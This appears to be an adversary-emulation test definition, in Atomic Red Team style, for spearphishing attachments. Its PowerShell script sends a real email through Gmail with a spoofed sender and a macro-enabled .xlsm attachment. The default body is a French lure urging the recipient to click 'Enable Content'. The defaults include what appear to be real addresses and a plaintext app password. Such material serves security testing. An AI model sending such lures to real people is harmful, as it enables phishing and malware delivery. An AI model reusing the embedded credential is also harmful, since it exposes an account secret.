attack_technique: T1566.001
display_name: 'Phishing: Spearphishing Attachment'
atomic_tests:
  - name: Simulate sending a phishing email with a malicious attachment via SMTP
    auto_generated_guid: custom-guid-phishing-attachment
    description: |
      This test simulates sending a phishing email with a malicious attachment using PowerShell.
      WARNING: THIS IS A SIMULATION AND SHOULD ONLY BE RUN IN A CONTROLLED ENVIRONMENT.
    supported_platforms:
      - windows
    input_arguments:
      smtp_server:
        description: Serveur SMTP à utiliser
        type: string
        default: "smtp.gmail.com"
      smtp_port:
        description: Port SMTP
        type: integer
        default: 587  # Port TLS
      sender_email:
        description: Adresse e-mail réelle pour l'authentification SMTP
        type: string
        default: "chaymaoumayma2003@gmail.com"  # Remplacez par une adresse Gmail valide
      sender_visible_email:
        description: Adresse e-mail visible dans le champ "From"
        type: string
        default: "chaymabouattour1@gmail.com"  # Utilisez un domaine similaire à celui de l'entreprise cible
      recipient_email:
        description: Adresse e-mail du destinataire
        type: string
        default: "oumaymakabadou2@gmail.com"  # Remplacez par une adresse email réelle
      subject:
        description: Objet personnalisé de l'e-mail
        type: string
        default: "⚠️ Document important à vérifier"
      body:
        description: Corps personnalisé de l'e-mail
        type: string
        default: |
          Bonjour [Nom],<br>
          Nous avons remarqué une activité inhabituelle sur votre compte. Pour protéger vos données, veuillez télécharger et consulter le document sécurisé ci-joint.<br>
          <br>
          ⚠️ IMPORTANT : Si le contenu semble restreint, veuillez cliquer sur "Activer le contenu" pour visualiser le document en entier.<br>
          <br>
          Merci de votre coopération.<br>
          Cordialement,<br>
          L'équipe de sécurité<br>
          <br>
          Contact : +1 123-456-7890<br>
          Site web : https://exemple.com
      attachment_path:
        description: Chemin vers la pièce jointe
        type: string
        default: "C:\\temp\\PhishingAttachment.xlsm"  # Référence directe au fichier téléchargé
      app_password:
        description: Mot de passe d'application pour l'authentification SMTP
        type: string
        default: "wbae yozc iyut rykk"  # Mot de passe d'application généré
      log_file:
        description: Chemin vers le fichier de journalisation
        type: string
        default: "C:\\temp\\phishing_logs.txt"
    executor:
      name: powershell
      elevation_required: false
      command: |
        $smtpServer = "#{smtp_server}"
        $smtpPort = #{smtp_port}
        $senderEmail = "#{sender_email}"  # Adresse réelle pour authentification
        $senderVisibleEmail = "#{sender_visible_email}"  # Adresse visible dans le champ "From"
        $recipientEmail = "#{recipient_email}"
        $subject = "#{subject}"
        $body = "#{body}"
        $attachmentPath = "#{attachment_path}"
        $securePassword = ConvertTo-SecureString "#{app_password}" -AsPlainText -Force
        $credential = New-Object System.Management.Automation.PSCredential($senderEmail, $securePassword)

        $headers = @{
            "X-Priority" = "1"
            "X-MSMail-Priority" = "High"
            "Importance" = "High"
        }

        Write-Host "📧 Envoi d'un email réel via SMTP..."
        try {
            Send-MailMessage -SmtpServer $smtpServer -Port $smtpPort -UseSsl `
                -From $senderVisibleEmail -To $recipientEmail `
                -Subject $subject -BodyAsHtml $body `
                -Attachments $attachmentPath -Credential $credential -Headers $headers -ErrorAction Stop
            Write-Host "✅ Email envoyé avec succès."

            $logEntry = "Email envoyé à $recipientEmail avec succès le $(Get-Date)"
            Add-Content -Path "#{log_file}" -Value $logEntry
        } catch {
            Write-Host "❌ Erreur lors de l'envoi de l'email : $_"
            exit 1
        }
